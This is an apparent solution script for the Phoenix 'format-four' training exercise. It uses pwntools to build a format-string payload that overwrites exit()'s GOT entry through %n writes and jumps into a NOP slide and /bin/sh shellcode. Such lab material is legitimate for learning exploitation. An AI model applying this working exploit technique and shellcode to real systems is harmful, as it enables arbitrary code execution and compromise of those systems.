from pwn import *


arch = "i486"
padding_char = b"X"


def pad(s, slen):
    return s+padding_char*(slen-len(s))


def remove_padding(s):
    return s.replace(padding_char, b"")


def to_str(s):
    return str(s, encoding="utf-8")


def to_bytes(s):
    return bytes(s, "utf-8")


def run(level, payload):
    write("/tmp/docgil", payload)
    print("payload: ")
    print(remove_padding(read("/tmp/docgil")))
    io = process("cat /tmp/docgil  | /opt/phoenix/" + arch + "/"+level, shell=True)
    return io.recvall()


def run_with_arg(level, arg):
    write("/tmp/docgil", arg)
    print("payload: ")
    print(remove_padding(read("/tmp/docgil")))
    io = process("/opt/phoenix/" + arch + "/"+level+" \"`cat /tmp/docgil`\"", shell=True)
    return io.recvall()


congratulations_adr = pack(0x08048503, 32)
congrats_adr_decimal = 134513923

exit_got = pack(0x80497e4, 32)
exit_got_upper = pack(0x80497e4+0x2, 32)

# HERE ARE THE VALUES FOR CONGRATS REDIRECTION
# target_value_hex = 0x08048503
# target_value_dec = congrats_adr_decimal
# too big for one write
# lower bytes need to be written first, otherwise would override upper bytes again
# lower 2 bytes = 0x8503
# upper 2 bytes = 0x0804
# lower_bytes_dec = 34051
# upper_bytes_dec = 2052


# HERE ARE THE VALUES FOR RCE
# new target adr is within buffer, so we can place shellcode there to run
buf_adr = 0xffffc6e0
# buf_adr + 0x100 = 0xffffc6e0+0x100
buf_start_slide_adr = 0xffffc7e0
# dec 0x4294952928
# lower 2 bytes = 0xc7e0
# upper 2 bytes = 0xffff
lower_bytes_dec = 51168
upper_bytes_dec = 65535

# upper bytes value is lower than lower bytes val -> need bigger value
# -> append 1
# -> this 1 will be written to other memory adr we dont care about
# adjusted: hex 0x10804
# upper_bytes_adj_dec = 67588

# diff shell code and %x paddings influence this value
magic_offset = 95 + 331 - 6

# find hammer length
# for i in range(0, 30):
#     payload = b""
#     print("index: " + str(i))
#     payload += b"B"*4
#     payload += exit_got
#     payload += b"B" * 4
#     payload += b"%p "*i
#     # payload += b"%n"
#     payload = pad(payload, 4096)
#     r = run("format-four", payload)
#     print(remove_padding(r))


nop_slide = b"\x90"*300
shell_code = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
lower_offset = lower_bytes_dec - magic_offset

payload = b""
payload += b"B"*4
payload += exit_got
payload += b"B"*4
payload += exit_got_upper
payload += b"B"*4
payload += nop_slide
payload += shell_code


payload += b"%p "*11
padding = "%" + str(lower_offset) + "x"
payload += to_bytes(padding)
payload += b"%n"

# upper_offset = (upper_bytes_adj_dec - lower_offset) - magic_offset
upper_offset = (upper_bytes_dec - lower_offset) - magic_offset

padding = "%" + str(upper_offset) + "x"
payload += to_bytes(padding)
payload += b"%n"

payload = pad(payload, 4096)
r = run("format-four", payload)
print(remove_padding(r))




